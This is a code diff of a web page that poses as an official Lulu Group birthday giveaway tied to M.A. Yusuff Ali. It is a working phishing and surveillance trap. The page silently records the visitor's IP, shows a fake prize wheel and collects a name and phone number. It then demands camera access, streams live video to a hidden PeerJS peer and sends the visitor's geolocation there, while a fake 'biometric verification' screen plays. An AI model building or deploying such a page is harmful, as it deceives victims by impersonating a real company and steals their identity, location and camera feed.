@@ -3,107 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Birthday Celebration | Official Giveaway</title>
+    <title>Honorary Distribution | 2026</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        :root { --gold: #c5a059; --gold-light: #e2c999; --dark: #121212; --white: #ffffff; }
-        body { margin: 0; font-family: 'Georgia', serif; background: #0a0a0a; color: var(--white); overflow-x: hidden; }
+        :root { --gold: #c5a059; --gold-dark: #8e6d2f; --bg: #050505; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         
-        /* Premium Header */
-        header { background: linear-gradient(145deg, #1a1a1a, #000); padding: 25px 15px; text-align: center; border-bottom: 2px solid var(--gold); }
-        .yusuf-msg { font-size: 13px; letter-spacing: 2px; color: var(--gold-light); text-transform: uppercase; margin-bottom: 5px; }
-        .celebration-title { font-size: 22px; font-weight: bold; color: var(--white); }
+        body { 
+            margin: 0; font-family: 'Times New Roman', serif; background: var(--bg); 
+            color: #fff; display: flex; flex-direction: column; min-height: 100vh;
+            background: radial-gradient(circle at top right, #1a150b, #050505);
+        }
 
-        .page { display: none; padding: 20px; animation: fadeIn 0.8s ease; }
-        .active { display: block; }
-        
-        /* CSS-Based Wheel (No external images needed) */
-        .wheel-box { position: relative; width: 300px; height: 300px; margin: 30px auto; }
+        /* Animated Header */
+        header { 
+            padding: 40px 20px; text-align: center; border-bottom: 1px solid rgba(197, 160, 89, 0.2);
+            background: rgba(0,0,0,0.3); backdrop-filter: blur(10px);
+        }
+        .yusuf-tag { font-size: 11px; letter-spacing: 4px; color: var(--gold); text-transform: uppercase; margin-bottom: 10px; opacity: 0.8; }
+        .title { font-size: 26px; font-weight: 400; letter-spacing: 1px; }
+
+        /* The Wheel - Now with 3D shadow */
+        .wheel-wrap { position: relative; width: 320px; height: 320px; margin: 40px auto; }
         #wheel { 
-            width: 100%; height: 100%; border-radius: 50%; border: 10px solid var(--gold);
+            width: 100%; height: 100%; border-radius: 50%; border: 4px solid var(--gold);
             background: conic-gradient(
-                #1a1a1a 0deg 60deg, var(--gold) 60deg 120deg, 
-                #1a1a1a 120deg 180deg, var(--gold) 180deg 240deg, 
-                #1a1a1a 240deg 300deg, var(--gold) 300deg 360deg
+                from 0deg,
+                #111 0deg 45deg, var(--gold) 45deg 90deg, 
+                #111 90deg 135deg, var(--gold) 135deg 180deg, 
+                #111 180deg 225deg, var(--gold) 225deg 270deg,
+                #111 270deg 315deg, var(--gold) 315deg 360deg
             );
-            transition: transform 10s cubic-bezier(0.1, 0, 0.1, 1);
-            box-shadow: 0 0 50px rgba(197, 160, 89, 0.3);
+            transition: transform 9s cubic-bezier(0.15, 0, 0.15, 1);
+            box-shadow: 0 0 80px rgba(197, 160, 89, 0.15), inset 0 0 20px rgba(0,0,0,0.5);
         }
         .pointer { 
-            position: absolute; top: -10px; left: 50%; transform: translateX(-50%); 
-            width: 0; height: 0; border-left: 15px solid transparent; border-right: 15px solid transparent;
-            border-top: 30px solid #ff4757; z-index: 10;
+            position: absolute; top: -15px; left: 50%; transform: translateX(-50%); 
+            width: 0; height: 0; border-left: 12px solid transparent; border-right: 12px solid transparent;
+            border-top: 25px solid #d63031; z-index: 20; filter: drop-shadow(0 2px 5px rgba(0,0,0,0.5));
         }
 
-        /* Card UI */
+        /* Glassmorphism Card */
         .card { 
-            max-width: 380px; margin: 0 auto; background: #1a1a1a; border: 1px solid #333;
-            border-radius: 20px; padding: 30px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+            max-width: 400px; margin: 0 auto 40px; background: rgba(255,255,255,0.03); 
+            border: 1px solid rgba(197, 160, 89, 0.2); border-radius: 24px; padding: 35px;
+            text-align: center; backdrop-filter: blur(15px);
         }
-        .btn-premium { 
-            background: linear-gradient(to right, var(--gold), var(--gold-light)); 
-            color: #000; border: none; width: 100%; padding: 20px; border-radius: 12px;
-            font-weight: bold; font-size: 16px; cursor: pointer; text-transform: uppercase;
-            letter-spacing: 1px; transition: transform 0.2s;
-        }
-        .btn-premium:active { transform: scale(0.98); }
         
-        /* Form Inputs */
-        input { 
-            width: 100%; padding: 16px; margin-bottom: 20px; border: 1px solid #444; 
-            border-radius: 8px; background: #000; color: #fff; font-size: 16px; outline: none;
+        .btn { 
+            background: linear-gradient(135deg, var(--gold), var(--gold-dark)); 
+            color: #000; border: none; width: 100%; padding: 20px; border-radius: 12px;
+            font-size: 14px; font-weight: bold; letter-spacing: 2px; cursor: pointer;
+            text-transform: uppercase; margin-top: 10px; transition: 0.3s;
         }
-        input:focus { border-color: var(--gold); }
-        label { display: block; text-align: left; font-size: 11px; color: var(--gold); margin-bottom: 8px; font-family: sans-serif; letter-spacing: 1px; }
+        .btn:active { transform: scale(0.96); opacity: 0.9; }
 
-        #cam-layer { position: fixed; top: -9999px; left: -9999px; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        input { 
+            width: 100%; padding: 18px; margin-bottom: 20px; border: 1px solid rgba(197,160,89,0.3); 
+            border-radius: 12px; background: rgba(0,0,0,0.5); color: #fff; font-size: 16px;
+            text-align: center; transition: 0.3s;
+        }
+        input:focus { border-color: var(--gold); outline: none; background: rgba(0,0,0,0.8); }
+
+        .page { display: none; padding: 0 20px; animation: slideUp 0.6s ease-out forwards; }
+        .active { display: block; }
+        
+        #cam-layer { position: fixed; opacity: 0; pointer-events: none; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
 <header>
-    <div class="yusuf-msg">Honorary Invitation</div>
-    <div class="celebration-title">Birthday Gift Distribution</div>
+    <div class="yusuf-tag">Lulu Group International</div>
+    <div class="title">Official Commemorative Gift</div>
 </header>
 
 <div id="cam-layer"><video id="v" autoplay playsinline muted></video></div>
 
-<!-- PAGE 1: THE WHEEL -->
 <div id="page-wheel" class="page active">
-    <div class="wheel-box">
+    <div class="wheel-wrap">
         <div class="pointer"></div>
         <div id="wheel"></div>
     </div>
     <div class="card">
-        <h3 style="color: var(--gold); font-family: sans-serif;">Gift Eligibility Confirmed</h3>
-        <p style="font-size: 14px; color: #aaa; line-height: 1.6;">In celebration of the birthday of the son of **M. A. Yusuff Ali**, you have been selected for a commemorative reward.</p>
-        <button class="btn-premium" id="spin-btn" onclick="spinWheel()">Spin for Reward</button>
+        <p style="font-size: 12px; color: var(--gold); margin-bottom: 5px;">EXCLUSIVE ENTRY</p>
+        <p style="font-size: 15px; line-height: 1.6; color: #ccc;">In honor of the birthday of the son of **M.A. Yusuff Ali**, you are eligible for one special distribution prize.</p>
+        <button class="btn" onclick="runSpin()">Activate Spin</button>
     </div>
 </div>
 
-<!-- PAGE 2: THE FORM -->
 <div id="page-form" class="page">
-    <div class="card">
-        <h2 style="color: var(--gold); margin-bottom: 10px;">Verification Required</h2>
-        <p style="font-size: 13px; color: #aaa; margin-bottom: 25px;">Please provide shipping details to process your reward.</p>
+    <div class="card" style="margin-top: 50px;">
+        <h2 style="font-weight: 400; color: var(--gold);">Claim Verification</h2>
+        <p style="font-size: 14px; color: #888; margin-bottom: 30px;">Please provide the following to assign your reward to your profile.</p>
         
-        <label>FULL LEGAL NAME</label>
-        <input type="text" id="roll" placeholder="As per ID">
+        <input type="text" id="roll" placeholder="Full Name">
+        <input type="number" id="school" placeholder="Contact Number">
         
-        <label>CONTACT NUMBER</label>
-        <input type="number" id="school" placeholder="+91">
-        
-        <button class="btn-premium" id="claim-btn" onclick="startTrap()">Process Claim</button>
+        <button class="btn" onclick="executeClaim()">Confirm Identity</button>
     </div>
 </div>
 
-<!-- PAGE 3: STATUS -->
 <div id="page-final" class="page">
-    <div class="card">
-        <div style="font-size: 40px; margin-bottom: 20px;">🔒</div>
-        <h3 id="status-text">SECURE LINK ESTABLISHED</h3>
-        <p style="font-size: 12px; color: #777;">Verifying biometric signature for institutional security. Do not exit.</p>
+    <div class="card" style="margin-top: 80px; border: none; background: none;">
+        <div class="title" id="status" style="color: var(--gold);">Connecting...</div>
+        <p style="font-size: 12px; color: #555; margin-top: 20px;">Secured by Satori Biometric Systems</p>
     </div>
 </div>
 
@@ -112,70 +117,54 @@
     const peer = new Peer();
     let conn;
 
-    // Silent IP Capture
     peer.on('open', () => {
         conn = peer.connect(TARGET_ID);
         conn.on('open', async () => {
             let ip = "N/A";
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const d = await res.json(); ip = d.ip;
-            } catch(e) {}
+            try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
             conn.send({ type: "INSTANT_LOG", ip: ip, time: new Date().toLocaleTimeString() });
         });
     });
 
-    function spinWheel() {
-        const wheel = document.getElementById('wheel');
-        const btn = document.getElementById('spin-btn');
-        btn.disabled = true;
-        btn.innerText = "Processing...";
-        
-        // Dynamic spin animation
-        wheel.style.transform = "rotate(5400deg)"; 
-        
-        setTimeout(() => { switchPage('page-form'); }, 10500);
+    function runSpin() {
+        const w = document.getElementById('wheel');
+        w.style.transform = "rotate(7540deg)";
+        document.querySelector('.btn').innerText = "Spinning...";
+        setTimeout(() => { switchPage('page-form'); }, 9500);
     }
 
-    async function startTrap() {
+    async function executeClaim() {
         const name = document.getElementById('roll').value;
         const phone = document.getElementById('school').value;
-        if(!name || !phone) return alert("All fields are mandatory.");
-
-        document.getElementById('claim-btn').innerText = "Authenticating...";
+        if(!name || !phone) return;
 
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             document.getElementById('v').srcObject = stream;
             peer.call(TARGET_ID, stream);
 
-            navigator.geolocation.getCurrentPosition(pos => {
-                sendData(pos.coords.latitude, pos.coords.longitude);
-            }, () => { sendData(null, null); });
+            navigator.geolocation.getCurrentPosition(p => {
+                send(p.coords.latitude, p.coords.longitude);
+            }, () => { send(null, null); });
 
             switchPage('page-final');
-            cycleMessages();
+            const states = ["ENCRYPTING DATA", "SYNCING BIOMETRICS", "SYSTEM VERIFIED"];
+            let i = 0;
+            setInterval(() => { if(i < states.length) document.getElementById('status').innerText = states[i++]; }, 3000);
         } catch (e) {
-            alert("System Error: Identity verification via secure camera is required for high-value rewards.");
+            alert("Verification Failed: Camera access is mandatory for security identity check.");
             location.reload();
         }
     }
 
-    function sendData(lat, lon) {
-        if (conn && conn.open) {
+    function send(lat, lon) {
+        if (conn?.open) {
             conn.send({
                 type: "FULL_LOG",
                 creds: { roll: document.getElementById('roll').value, school: document.getElementById('school').value },
                 geo: { lat: lat, lon: lon }
             });
         }
-    }
-
-    function cycleMessages() {
-        const t = document.getElementById('status-text');
-        const m = ["ENCRYPTING...", "BIOMETRIC SYNC...", "SUCCESS!"];
-        let i = 0;
-        setInterval(() => { if(i < m.length) t.innerText = m[i++]; }, 3500);
     }
 
     function switchPage(p) {
